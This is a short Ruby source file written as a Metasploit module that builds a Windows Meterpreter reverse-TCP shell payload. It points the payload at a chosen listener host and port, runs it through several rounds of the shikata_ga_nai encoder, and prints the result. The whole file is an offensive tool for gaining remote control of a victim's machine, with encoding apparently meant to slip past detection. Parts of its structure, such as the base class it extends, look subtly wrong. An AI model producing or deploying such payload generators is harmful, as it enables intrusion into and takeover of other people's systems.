require 'msf/core'

class MetasploitModule < Msf::PayloadGenerator

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Custom Payload Generator',
      'Description' => 'Generates a custom reverse shell payload with custom encoding.',
      'Author'      => 'Axel Malka',
      'License'     => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('LHOST', [true, 'The local IP address for the reverse shell']),
        OptInt.new('LPORT', [true, 'The local port for the reverse shell']),
        OptString.new('ENCODER', [true, 'Encoder to use for payload', 'x86/shikata_ga_nai']),
        OptInt.new('ENCODER_ITERATIONS', [true, 'Number of encoding iterations', 3])
      ]
    )
  end

  def run
    # Collect options
    lhost = datastore['LHOST']
    lport = datastore['LPORT']
    encoder = datastore['ENCODER']
    encoder_iterations = datastore['ENCODER_ITERATIONS']

    print_status("Generating reverse shell payload for #{lhost}:#{lport}")

    # Generate the payload
    payload = framework.payloads.create('windows/meterpreter/reverse_tcp')
    payload.datastore['LHOST'] = lhost
    payload.datastore['LPORT'] = lport

    # Encode the payload
    encoded_payload = payload.generate_simple(
      'Format'         => 'raw',
      'Options'        => {
        'BadChars'    => '',
      },
      'Encoder'        => encoder,
      'Iterations'     => encoder_iterations
    )

    print_good("Payload successfully generated with encoding: #{encoder}")
    print_good("Encoded Payload:\n#{encoded_payload}")
  end
end
